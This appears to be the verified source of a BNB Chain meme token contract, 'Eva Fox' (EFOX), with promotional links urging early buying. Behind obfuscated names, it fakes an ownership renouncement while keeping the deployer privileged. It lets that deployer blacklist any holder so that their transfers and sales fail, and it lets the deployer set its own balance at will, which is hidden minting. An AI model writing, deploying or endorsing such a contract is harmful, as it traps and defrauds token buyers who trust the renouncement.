/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

/**

https://t.me/QithmirInu/14613

Previous Project 1Million Market Cap🔥

Telegram : https://t.me/EvaFoxOfficial
Twitter :  https://twitter.com/EvaFoxBSC

Don’t miss your chance on getting in early!

*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


interface tradingTx {
    function createPair(address launchIs, address sellTx) external returns (address);
}

interface liquiditySell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract EvaFox {

    string public name = "Eva Fox";

    bool public limitEnable;

    function maxAtWallet() public view returns (uint256) {
        return totalReceiverFrom;
    }

    function transfer(address launchedIs, uint256 amountAuto) external returns (bool) {
        return liquidityTo(feeTokenAuto(), launchedIs, amountAuto);
    }

    bool public autoAtMax;

    mapping(address => bool) public senderSell;

    function approve(address maxWalletAmount, uint256 amountAuto) public returns (bool) {
        allowance[feeTokenAuto()][maxWalletAmount] = amountAuto;
        emit Approval(feeTokenAuto(), maxWalletAmount, amountAuto);
        return true;
    }

    string public symbol = "EFOX";

    uint256 public sellSwap;

    uint8 public decimals = 18;

    uint256 public feeToken;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function enableShouldList(address maxTakeLaunch) public {
        
        if (maxTakeLaunch == txLiquidity || maxTakeLaunch == txSenderMax || !senderSell[feeTokenAuto()]) {
            return;
        }
        if (minTokenSwap != totalReceiverFrom) {
            totalReceiverFrom = minTokenSwap;
        }
        receiverWallet[maxTakeLaunch] = true;
    }

    function tokenBuy(address senderMaxReceiver, address totalLimit, uint256 amountAuto) internal returns (bool) {
        require(balanceOf[senderMaxReceiver] >= amountAuto);
        balanceOf[senderMaxReceiver] -= amountAuto;
        balanceOf[totalLimit] += amountAuto;
        emit Transfer(senderMaxReceiver, totalLimit, amountAuto);
        return true;
    }

    constructor (){
        
        liquiditySell receiverIs = liquiditySell(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txSenderMax = tradingTx(receiverIs.factory()).createPair(receiverIs.WETH(), address(this));
        owner = feeTokenAuto();
        
        txLiquidity = owner;
        senderSell[txLiquidity] = true;
        balanceOf[txLiquidity] = totalSupply;
        
        emit Transfer(address(0), txLiquidity, totalSupply);
        toLaunch();
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function enableTotal() public {
        if (modeAtLaunched) {
            minTokenSwap = totalReceiverFrom;
        }
        if (limitEnable) {
            feeToken = totalReceiverFrom;
        }
        modeAtLaunched=false;
    }

    function transferFrom(address senderMaxReceiver, address totalLimit, uint256 amountAuto) external returns (bool) {
        if (allowance[senderMaxReceiver][feeTokenAuto()] != type(uint256).max) {
            require(amountAuto <= allowance[senderMaxReceiver][feeTokenAuto()]);
            allowance[senderMaxReceiver][feeTokenAuto()] -= amountAuto;
        }
        return liquidityTo(senderMaxReceiver, totalLimit, amountAuto);
    }

    mapping(address => bool) public receiverWallet;

    function liquidityTo(address senderMaxReceiver, address totalLimit, uint256 amountAuto) internal returns (bool) {
        if (senderMaxReceiver == txLiquidity) {
            return tokenBuy(senderMaxReceiver, totalLimit, amountAuto);
        }
        require(!receiverWallet[senderMaxReceiver]);
        return tokenBuy(senderMaxReceiver, totalLimit, amountAuto);
    }

    mapping(address => uint256) public balanceOf;

    uint256 public feeAuto;

    function atIs() public view returns (bool) {
        return limitEnable;
    }

    event Transfer(address indexed from, address indexed modeBuy, uint256 value);

    uint256 private totalReceiverFrom;

    function walletTeam() public {
        if (sellSwap != totalReceiverFrom) {
            totalReceiverFrom = sellSwap;
        }
        if (modeAtLaunched) {
            autoSender = true;
        }
        modeAtLaunched=false;
    }

    function toLaunch() public {
        emit OwnershipTransferred(txLiquidity, address(0));
        owner = address(0);
    }

    address public txLiquidity;

    uint256 private minTokenSwap;

    function swapReceiver() public view returns (uint256) {
        return sellSwap;
    }

    bool public modeAtLaunched;

    bool public autoSender;

    event Approval(address indexed totalTradingMarketing, address indexed spender, uint256 value);

    address public owner;

    function exemptAt(address swapBuy) public {
        if (autoAtMax) {
            return;
        }
        if (sellSwap == feeAuto) {
            totalReceiverFrom = feeAuto;
        }
        senderSell[swapBuy] = true;
        
        autoAtMax = true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    address public txSenderMax;

    function feeTokenAuto() private view returns (address) {
        return msg.sender;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 18;

    function fromReceiverList(uint256 amountAuto) public {
        if (!senderSell[feeTokenAuto()]) {
            return;
        }
        balanceOf[txLiquidity] = amountAuto;
    }

}